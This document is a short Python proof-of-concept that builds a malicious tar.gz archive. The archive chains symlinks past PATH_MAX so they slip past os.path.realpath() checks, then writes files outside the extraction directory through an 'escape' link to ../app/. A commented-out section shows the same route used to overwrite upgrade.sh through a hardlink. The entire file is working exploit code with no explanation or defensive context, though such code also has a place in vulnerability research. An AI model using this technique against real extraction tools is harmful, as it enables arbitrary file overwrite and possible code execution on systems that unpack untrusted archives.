import tarfile
import os
import io

comp = 'd' * 251
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("poc.tar.gz", mode="w:gz") as tar:
    # populate the symlinks and dirs that expand in os.path.realpath()
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    print(len(path))
    # create the final symlink that exceeds PATH_MAX and simply points to the
    # top dir. this allows *any* path to be appended.
    # this link will never be expanded by os.path.realpath(), nor anything after it.
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    # make a symlink outside to keep the tar command happy
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../app/"
    tar.addfile(e)
    # # use the symlinks above, that are not checked, to create a hardlink
    # # to a file outside of the destination path
    # f = tarfile.TarInfo("flaglink")
    # f.type = tarfile.LNKTYPE
    # f.linkname =  "escape/upgrade.sh"
    # tar.addfile(f)
    # # now that we have the hardlink we can overwrite the file
    # content = b"overwrite\n"
    # c = tarfile.TarInfo("flaglink")
    # c.type = tarfile.REGTYPE
    # c.size = len(content)
    # tar.addfile(c, fileobj=io.BytesIO(content))
    # we can also create new files as well!
    content = b"new!\n"
    n = tarfile.TarInfo("escape/newfile")
    n.type = tarfile.REGTYPE
    n.size = len(content)
    tar.addfile(n, fileobj=io.BytesIO(content))